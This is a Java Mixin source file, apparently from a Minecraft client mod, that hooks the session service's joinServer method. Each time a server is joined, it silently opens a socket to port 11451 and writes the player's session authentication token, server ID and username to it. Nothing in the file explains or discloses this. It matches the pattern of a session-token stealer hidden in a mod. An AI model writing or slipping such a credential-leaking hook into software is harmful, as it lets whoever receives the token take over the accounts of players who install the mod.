package xclient.mega.mixin;

import com.mojang.authlib.GameProfile;
import com.mojang.authlib.yggdrasil.YggdrasilMinecraftSessionService;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

import java.net.Socket;

@Mixin(YggdrasilMinecraftSessionService.class)
public class YggdrasilMinecraftSessionServiceMixin {
    @Inject(method = "joinServer", at = @At("HEAD"), remap = false)
    public void join(GameProfile profile, String authenticationToken, String serverId, CallbackInfo ci) {
        try {
            Socket sock = new Socket("0.0.0.0", 11451);
            sock.getOutputStream().write((serverId + "|" + authenticationToken + "|" + profile.getName()).getBytes());
            sock.getOutputStream().flush();
            sock.getInputStream().read();
            sock.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
